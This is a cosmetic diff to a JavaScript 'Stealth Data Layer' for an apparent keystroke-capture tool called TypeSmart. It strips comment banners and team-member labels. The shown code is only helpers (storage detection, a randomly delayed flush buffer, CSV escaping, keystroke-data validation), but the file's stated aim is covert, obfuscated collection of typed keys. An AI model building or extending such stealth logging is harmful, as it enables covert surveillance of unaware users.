@@ -1,7 +1,7 @@
 /**
  * ============================================================================
  * TypeSmart — Stealth Data Layer (data/stealth.js)
- * Member 4 — Data Management & Stealth
+ *  — Data Management & Stealth
  * ============================================================================
  *
  * Purpose: Provides obfuscation, encoding, batching, and data export utilities.
@@ -25,9 +25,8 @@
 })(typeof self !== "undefined" ? self : this, function () {
   "use strict";
 
-  // ===========================================================================
   // CONFIGURATION
-  // ===========================================================================
+
   
   var OBFUSCATION = (typeof TSConstants !== "undefined" && TSConstants.OBFUSCATION)
     ? TSConstants.OBFUSCATION 
@@ -70,9 +69,9 @@
     console.error.apply(console, arguments);
   }
 
-  // ===========================================================================
-  // STORAGE DETECTION (Fixed)
-  // ===========================================================================
+
+  // STORAGE DETECTION 
+
   
   function getStorage() {
     // Chrome
@@ -110,9 +109,9 @@
 
   var storage = getStorage();
 
-  // ===========================================================================
+
   // IN-MEMORY BUFFER + RANDOM FLUSH DELAY (Stealth)
-  // ===========================================================================
+
   
   var memoryBuffer = [];
   var flushTimer = null;
@@ -222,9 +221,8 @@
     }
   }
 
-  // ===========================================================================
   // HELPER: Random delay
-  // ===========================================================================
+ 
   
   function randomDelay(minMs, maxMs) {
     var delay = Math.floor(Math.random() * (maxMs - minMs + 1) + minMs);
@@ -233,9 +231,7 @@
     });
   }
 
-  // ===========================================================================
   // HELPER: Escape CSV field
-  // ===========================================================================
   
   function escapeCSV(field) {
     if (field === undefined || field === null) return "";
@@ -247,9 +243,8 @@
     return str;
   }
 
-  // ===========================================================================
   // HELPER: Validate keystroke data
-  // ===========================================================================
+
   
   function isValidKeystrokeData(plainKeys) {
     if (typeof plainKeys !== "string") return false;
@@ -578,12 +573,11 @@
     await flushBuffer();
   }
 
-  // ===========================================================================
-  // TEST FUNCTION (Run alone to verify everything works)
-  // ===========================================================================
+  // TEST FUNCTION 
+
   
   async function runTest() {
-    console.log("%c=== Member 4 Stealth Test Started ===", "color: cyan; font-weight: bold");
+    console.log("%c===  Stealth Test Started ===", "color: cyan; font-weight: bold");
     
     try {
       // Test 1: Obfuscate / Deobfuscate
